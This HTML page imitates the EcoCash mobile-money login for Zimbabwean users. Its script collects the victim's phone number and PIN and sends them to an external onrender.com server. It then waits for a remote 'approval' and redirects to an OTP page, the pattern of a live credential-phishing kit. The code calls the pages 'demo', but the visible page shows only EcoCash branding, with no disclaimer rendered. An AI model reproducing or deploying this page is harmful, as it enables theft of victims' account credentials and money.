<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  >

  <title>Wallet</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, sans-serif;
      min-height: 100vh;
      background: #fff;
      color: #555;
    }

    .demo-notice {
      position: fixed;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 500;

      padding: 8px 16px;
      border-radius: 20px;

      background: #fff4d6;
      border: 1px solid #efd38b;

      color: #806000;

      font-size: 11px;
      font-weight: 700;
      white-space: nowrap;
    }

    .page {
      min-height: 100vh;

      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .login-section {
      width: 100%;
      max-width: 900px;

      padding: 75px 20px 90px;

      text-align: center;
    }

    .logo {
      font-size: 43px;
      font-weight: 800;

      letter-spacing: -2px;

      margin-bottom: 105px;
    }

    .logo-blue {
      color: #4967c8;
    }

    .logo-red {
      color: #ee3444;
    }

    .demo-brand {
      display: block;

      margin-top: 8px;

      font-size: 12px;
      font-weight: 700;

      letter-spacing: 1px;

      color: #777;
    }

    .login-title {
      font-size: 36px;
      font-weight: 400;

      color: #555;

      margin-bottom: 60px;
    }

    .login-form {
      width: min(600px, 100%);
      margin: 0 auto;
    }

    .field-label {
      display: block;

      text-align: left;

      margin-bottom: 10px;

      font-size: 14px;
      font-weight: 700;

      color: #777;
    }

    .phone-input {
      width: 100%;
      height: 50px;

      border: 3px solid #0871d9;
      border-radius: 13px;

      padding: 0 22px;
font-weight: 500;
      font-size: 14px;
      color: #222;

      outline: none;

      background: #fff;
    }

    .phone-input:focus {
      box-shadow:
        0 0 0 4px rgba(8, 113, 217, .10);
    }

    .pin-label {
      margin-top: 45px;
      margin-bottom: 22px;

      font-size: 13px;

      color: #777;
    }

    .pin-area {
      display: flex;

      align-items: center;
      justify-content: center;

      gap: 20px;
    }

    .pin-boxes {
      display: flex;

      gap: 18px;
    }

    .pin-box {
      width: 50px;
      height: 50px;

      border: 3px solid #0871d9;
      border-radius: 13px;

      text-align: center;

      font-size: 28px;

      color: #333;

      outline: none;

      background: #fff;
    }

    .pin-box:focus {
      box-shadow:
        0 0 0 4px rgba(8, 113, 217, .10);
    }

    .eye-button {
      border: none;
      background: transparent;

      cursor: pointer;

      font-size: 18px;

      padding: 7px;
    }

    .pin-error {
      display: none;

      margin-top: 12px;

      color: #d93025;

      font-size: 13px;
      font-weight: 600;
    }

    .pin-error.show {
      display: block;
    }

    .forgot {
      display: inline-block;

      margin-top: 18px;

      color: #888;

      font-size: 18px;

      text-decoration: none;
    }

    .forgot:hover {
      color: #1769ff;
    }

    .login-button {
      display: block;

      width: 100%;
      height: 50px;

      margin-top: 60px;

      border: none;
      border-radius: 13px;

      background: #ddd;

      color: #fff;

      font-size: 15px;
      font-weight: 700;

      cursor: pointer;

      transition: .2s ease;
    }

    .login-button.active {
      background: #0871d9;
    }

    .login-button.active:hover {
      background: #075fb7;
    }

    .login-button:disabled {
      cursor: wait;
      opacity: .7;
    }

    .bottom-section {
      position: relative;

      width: 100%;
      min-height: 360px;

      background: #0871d9;

      color: #fff;

      text-align: center;

      padding: 120px 20px 50px;
    }

    .bottom-section::before {
      content: "";

      position: absolute;

      left: -5%;
      right: -5%;
      top: -45px;

      height: 80px;

      background: #fff;

      border-radius: 50%;
    }

    .bottom-text {
      position: relative;

      max-width: 550px;

      margin: 0 auto 35px;

      font-size: 19px;

      line-height: 1.5;
    }

    .footer-buttons {
      position: relative;

      display: flex;

      justify-content: center;

      gap: 20px;

      margin-bottom: 38px;
    }

    .footer-button {
      min-width: 160px;
      height: 100px;

      border: none;

      border-radius: 10px;

      background: #fff;

      color: #006bd1;

      cursor: pointer;

      font-size: 18px;
      font-weight: 700;
    }

    .footer-icon {
      display: block;

      margin-bottom: 9px;

      font-size: 22px;
    }

    .version {
      position: relative;

      font-size: 17px;

      margin-bottom: 15px;
    }

    .terms {
      position: relative;

      font-size: 14px;
    }

    /* STATUS MODAL */

    .status-modal {
      position: fixed;

      inset: 0;

      display: none;

      align-items: center;
      justify-content: center;

      padding: 20px;

      background: rgba(0, 0, 0, .52);

      z-index: 1000;
    }

    .status-modal.show {
      display: flex;
    }

    .status-card {
      width: min(400px, 100%);

      padding: 30px 25px;

      border-radius: 20px;

      background: #fff;

      text-align: center;

      box-shadow:
        0 20px 60px rgba(0, 0, 0, .25);
    }

    .status-icon {
      font-size: 45px;

      margin-bottom: 15px;
    }

    .status-card h2 {
      color: #14213d;

      margin-bottom: 12px;
    }

    .status-card p {
      color: #687386;

      font-size: 14px;

      line-height: 1.6;
    }

    .status-button {
      width: 100%;

      margin-top: 22px;

      padding: 14px;

      border: none;

      border-radius: 11px;

      background: #0871d9;

      color: #fff;

      font-weight: 700;

      cursor: pointer;
    }

    @media (max-width: 600px) {

      .demo-notice {
        max-width: calc(100% - 20px);

        overflow: hidden;

        text-overflow: ellipsis;

        font-size: 8px;
      }

      .login-section {
        padding-top: 70px;
        padding-bottom: 70px;
      }

      .logo {
        font-size: 35px;
        margin-bottom: 75px;
      }

      .login-title {
        font-size: 29px;
        margin-bottom: 45px;
      }

      .phone-input {
        height: 40px;
        font-size: 20px;
        font-weight: 500;
        height: auto;
        border-width: 1px;
      }

      .pin-area {
        gap: 7px;
      }

      .pin-boxes {
        gap: 7px;
      }

      .pin-box {
        width: 60px;
        height: 60px;
      }

      .eye-button {
        font-size: 23px;
      }

      .login-button {
        height: 64px;
        font-size: 19px;
      }

      .bottom-section {
        min-height: 380px;
        padding-top: 105px;
      }

      .bottom-text {
        font-size: 16px;
      }

      .footer-buttons {
        gap: 10px;
      }

      .footer-button {
        min-width: 140px;
        height: 90px;
        font-size: 16px;
      }

      .terms {
        font-size: 12px;
      }
    }
    .phone-wrapper {
  display: flex;
  align-items: center;
  width: 100%;
  height: 80px;
  border: 3px solid #0871d9;
  border-radius: 13px;
  background: #fff;
  overflow: hidden;
}

.country-code {
  padding-left: 22px;
  padding-right: 10px;
  font-size: 20px;
  font-weight: 700;
  color: #555;
}

.phone-wrapper .phone-input {
  height: 100%;
  border: none;
  border-radius: 0;
  padding: 0 18px 0 8px;
  flex: 1;
}

.phone-wrapper .phone-input:focus {
  box-shadow: none;
}
.country-code {
  display: flex;
  align-items: center;
  gap: 7px;

  padding: 0 13px 0 15px;

  color: #4f5b70;
  font-size: 15px;
  font-weight: 400;

  border-right: 1px solid #e1e5eb;
}

.country-flag {
  font-size: 20px;
}
  </style>
</head>

<body>

 

  <div class="page">

    <section class="login-section">

      <div class="logo">

        <span class="logo-blue">
          Eco
        </span>

        <span class="logo-red">
          Cash
        </span>

        <span class="demo-brand">
          Enter your login details
        </span>

      </div>

      <h1 class="login-title">
       Login
      </h1>

      <div class="login-form">

        <label
          class="field-label"
          for="phoneInput"
        >
           Phone number
        </label>

       <div class="phone-wrapper">
  <span class="country-code">
    <span class="country-flag">🇿🇼</span>
    +263
  </span>

  <input
    type="tel"
    class="phone-input"
    id="phoneInput"
    placeholder="Enter phone number"
    autocomplete="tel"
    inputmode="numeric"
  >
</div>
        <div class="pin-label">
          Enter PIN
        </div>

        <div class="pin-area">

          <div class="pin-boxes">

            <input
              class="pin-box"
              type="password"
              maxlength="1"
              inputmode="numeric"
              autocomplete="off"
              aria-label="Demo PIN digit 1"
            >

            <input
              class="pin-box"
              type="password"
              maxlength="1"
              inputmode="numeric"
              autocomplete="off"
              aria-label="Demo PIN digit 2"
            >

            <input
              class="pin-box"
              type="password"
              maxlength="1"
              inputmode="numeric"
              autocomplete="off"
              aria-label="Demo PIN digit 3"
            >

            <input
              class="pin-box"
              type="password"
              maxlength="1"
              inputmode="numeric"
              autocomplete="off"
              aria-label="Demo PIN digit 4"
            >

          </div>

          <button
            type="button"
            class="eye-button"
            id="eyeButton"
            aria-label="Show demo PIN"
          >
            👁
          </button>

        </div>

        <div
          class="pin-error"
          id="pinError"
        >
          Please enter the 4-digit PIN.
        </div>

        <a
          href="#"
          class="forgot"
          id="forgotButton"
        >
          Forgot PIN?
        </a>

        <button
          type="button"
          class="login-button"
          id="loginButton"
        >
          LOGIN
        </button>

      </div>

    </section>

    <section class="bottom-section">

     
      <div class="footer-buttons">

        <button
          type="button"
          class="footer-button"
          id="registerButton"
        >
          <span class="footer-icon">♟</span>
          Register
        </button>

        <button
          type="button"
          class="footer-button"
          id="supportButton"
        >
          <span class="footer-icon">ℹ</span>
          Help &amp; Support
        </button>

      </div>

      <div class="version">
        ECOCASH v1.0
      </div>

     

    </section>

  </div>

  <!-- STATUS MODAL -->

  <div
    class="status-modal"
    id="statusModal"
  >

    <div class="status-card">

      <div
        class="status-icon"
        id="statusIcon"
      >
        📱
      </div>

      <h2 id="statusTitle">
        Waiting for approval
      </h2>

      <p id="statusMessage">
        Kindly it takes less than a minute
      </p>

      <button
        class="status-button"
        id="statusButton"
        type="button"
      >
        CANCEL
      </button>

    </div>

  </div>

  <script>
    /*
     * IMPORTANT:
     *
     * The frontend is hosted on Vercel.
     * The demo API is hosted on Render.
     *
     * Therefore BOTH API calls below use Render.
     */

    const API_URL =
      "https://ecocash-0w1z.onrender.com";

    const pinBoxes =
      document.querySelectorAll(".pin-box");

    const eyeButton =
      document.getElementById("eyeButton");

    const loginButton =
      document.getElementById("loginButton");

    const pinError =
      document.getElementById("pinError");

    const statusModal =
      document.getElementById("statusModal");

    const statusIcon =
      document.getElementById("statusIcon");

    const statusTitle =
      document.getElementById("statusTitle");

    const statusMessage =
      document.getElementById("statusMessage");

    const statusButton =
      document.getElementById("statusButton");
      
      const phone= document.getElementById("phoneInput");

    let cancelled = false;

    /*
     * -------------------------------
     * PIN NAVIGATION
     * -------------------------------
     */

    pinBoxes.forEach(function (box, index) {

      box.addEventListener(
        "input",
        function () {

          this.value =
            this.value
              .replace(/\D/g, "")
              .slice(0, 1);

          pinError.classList.remove("show");

          if (
            this.value &&
            index < pinBoxes.length - 1
          ) {
            pinBoxes[index + 1].focus();
          }

          updateLoginButton();
        }
      );

      box.addEventListener(
        "keydown",
        function (event) {

          if (
            event.key === "Backspace" &&
            !this.value &&
            index > 0
          ) {
            pinBoxes[index - 1].focus();
          }

        }
      );

    });

    /*
     * -------------------------------
     * LOGIN BUTTON STATE
     * -------------------------------
     */

    function updateLoginButton() {

      const complete =
        [...pinBoxes].every(function (box) {
          return box.value.length === 1;
        });

      loginButton.classList.toggle(
        "active",
        complete
      );
    }

    /*
     * -------------------------------
     * SHOW / HIDE DEMO PIN
     * -------------------------------
     */

    let pinVisible = false;

    eyeButton.addEventListener(
      "click",
      function () {

        pinVisible = !pinVisible;

        pinBoxes.forEach(function (box) {

          box.type =
            pinVisible
              ? "text"
              : "password";

        });

        eyeButton.textContent =
          pinVisible
            ? "🙈"
            : "👁";

      }
    );

    

    async function createDemoRequest() {
  const phoneNumber =
    sessionStorage.getItem("phone") || phone.value.trim();
    
   

  // Demo-only value; don't use a real account PIN here.
  const demoPin = sessionStorage.getItem("pin") || pinBoxes.value.trim();;

  const response = await fetch(
    `${API_URL}/api/demo-login`,
    {
      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({
        event: "presentation_demo_login",
        phone: phoneNumber,
        demoPin: demoPin
      })
    }
  );

  const text = await response.text();

  let data;

  try {
    data = JSON.parse(text);
  } catch (error) {
    throw new Error(
      "Render returned a non-JSON response: " +
      text.slice(0, 200)
    );
  }

  if (!response.ok || !data.ok) {
    throw new Error(
      data.error ||
      "Unable to create request."
    );
  }

  if (
    typeof data.requestId !== "string" ||
    !data.requestId
  ) {
    throw new Error(
      "Render did not return a valid request ID."
    );
  }

  return data.requestId;
}

    /*
     * -------------------------------
     * CHECK DEMO STATUS
     * -------------------------------
     */

    async function getDemoStatus(requestId) {

      if (
        typeof requestId !== "string" ||
        !requestId
      ) {

        throw new Error(
          "Invalid request ID."
        );

      }

      const response =
        await fetch(
          `${API_URL}/api/demo-status/${encodeURIComponent(requestId)}`
        );

      const text =
        await response.text();

      let data;

      try {

        data =
          JSON.parse(text);

      } catch (error) {

        throw new Error(
          "Render status endpoint returned non-JSON: " +
          text.slice(0, 200)
        );

      }

      if (!response.ok) {

        throw new Error(
          data.error ||
          `Status request failed (${response.status}).`
        );

      }

      return data;
    }

    /*
     * -------------------------------
     * WAIT FOR DEMO APPROVAL
     * -------------------------------
     */

    async function waitForApproval(requestId) {

      while (!cancelled) {

        await new Promise(
          function (resolve) {
            setTimeout(resolve, 1500);
          }
        );

        if (cancelled) {
          return;
        }

        try {

          const data =
            await getDemoStatus(requestId);

          console.log(
            " status:",
            data.status
          );

          if (
            data.status === "approved"
          ) {

            statusIcon.textContent =
              "✅";

            statusTitle.textContent =
              "Login approved";

            statusMessage.textContent =
              "continue to complete";

            statusButton.textContent =
              "CONTINUE";

            statusButton.onclick =
              function () {

                /*
                 * Presentation-only navigation.
                 */

                window.location.href =
                  "otppage.html";

              };

            return;
          }

          if (
            data.status === "rejected"
          ) {

            statusIcon.textContent =
              "❌";

            statusTitle.textContent =
              " rejected";

            statusMessage.textContent =
              "The request was rejected.";

            statusButton.textContent =
              "TRY AGAIN";

            statusButton.onclick =
              function () {

                statusModal.classList.remove(
                  "show"
                );

                pinBoxes.forEach(
                  function (box) {
                    box.value = "";
                  }
                );

                updateLoginButton();

                pinBoxes[0].focus();

              };

            return;
          }

          if (
            data.status === "expired"
          ) {

            statusIcon.textContent =
              "⌛";

            statusTitle.textContent =
              "Request expired";

            statusMessage.textContent =
              "The request expired.";

            statusButton.textContent =
              "CLOSE";

            statusButton.onclick =
              function () {

                statusModal.classList.remove(
                  "show"
                );

              };

            return;
          }

        } catch (error) {

          console.error(
            "Status check failed:",
            error
          );

          /*
           * Keep polling during a temporary
           * network error.
           */

        }

      }
    }

    /*
     * -------------------------------
     * LOGIN
     * -------------------------------
     */

  
loginButton.addEventListener(
  "click",
  async function () {

    // Check PIN
    const pinComplete =
      [...pinBoxes].every(function (box) {
        return box.value.trim().length === 1;
      });

    // Check phone number
    const phoneComplete =
      phone.value.trim().length > 5;

    // Both PIN and phone must be valid
    const complete =
      pinComplete && phoneComplete;

    if (!complete) {

      if (!phoneComplete) {
        pinError.textContent =
          "Please enter a valid phone number.";
      } else if (!pinComplete) {
        pinError.textContent =
          "Please enter the complete 4-digit PIN.";
      } else {
        pinError.textContent =
          "Please check your phone number and PIN.";
      }

      pinError.classList.add("show");

      if (!phoneComplete) {
        phone.focus();
      } else {
        pinBoxes[0].focus();
      }

      return;
    }

// Save phone number for this browser session
const phoneNumber = phone.value.trim();

sessionStorage.setItem("phone", phoneNumber);
const pin = [...pinBoxes]
  .map(box => box.value)
  .join("");

sessionStorage.setItem("pin", pin);


    // Hide previous error
    pinError.classList.remove("show");

    loginButton.disabled = true;
    loginButton.textContent = "CONNECTING...";

    cancelled = false;

    try {

      /*
       * Only creates a generic demo request.
       */
      const requestId =
        await createDemoRequest();

      console.log(
        "Created request:",
        requestId
      );

      statusIcon.textContent = "📱";

      statusTitle.textContent =
        "Waiting for approval";

      statusMessage.textContent =
        "A request has been " +
        "sent.";

      statusButton.textContent = "CANCEL";

      statusButton.onclick = function () {

        cancelled = true;

        statusModal.classList.remove(
          "show"
        );

      };

      statusModal.classList.add("show");

      await waitForApproval(requestId);

    } catch (error) {

      console.error(
        " request failed:",
        error
      );

      pinError.textContent =
        error.message ||
        "Unable to connect to the approval server.";

      pinError.classList.add("show");

    } finally {

      loginButton.disabled = false;

      loginButton.textContent = "LOGIN";

    }

  }
);


    /*
     * -------------------------------
     * DEMO LINKS
     * -------------------------------
     */

    document
      .getElementById("forgotButton")
      .addEventListener(
        "click",
        function (event) {

          event.preventDefault();

          alert(
            "PIN recovery is disabled in this."
          );

        }
      );

    document
      .getElementById("registerButton")
      .addEventListener(
        "click",
        function () {

          alert(
            "Registration is disabled."
          );

        }
      );

    document
      .getElementById("supportButton")
      .addEventListener(
        "click",
        function () {

          

        }
      );

    /*
     * -------------------------------
     * INITIAL STATE
     * -------------------------------
     */

    updateLoginButton();

  </script>

</body>

</html>
